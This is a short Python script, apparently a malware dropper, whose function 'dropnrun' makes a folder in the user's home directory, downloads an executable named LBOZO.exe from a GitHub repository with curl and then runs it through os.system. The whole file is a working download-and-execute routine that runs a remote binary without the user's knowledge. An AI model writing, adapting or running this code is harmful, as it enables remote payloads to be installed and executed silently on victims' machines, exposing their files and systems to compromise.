import os


def dropnrun(programname):
    path = os.path.expanduser("~")
    os.chdir(path)
    os.mkdir(programname)
    os.chdir(programname)
    os.system("curl -OL https://github.com/Frikallo/LBOZO/raw/main/out/LBOZO.exe")
    finaldest = os.getcwd()
    with open("LBOZO.exe", "rb") as f:
        LBOZO = f.read()
    with open(f"{finaldest}/LBOZO.exe", "wb") as f:
        f.write(LBOZO)

    command = "{}".format(f"{finaldest}/LBOZO.exe")
    print(command)
    os.system(command)


dropnrun("LBOZO")
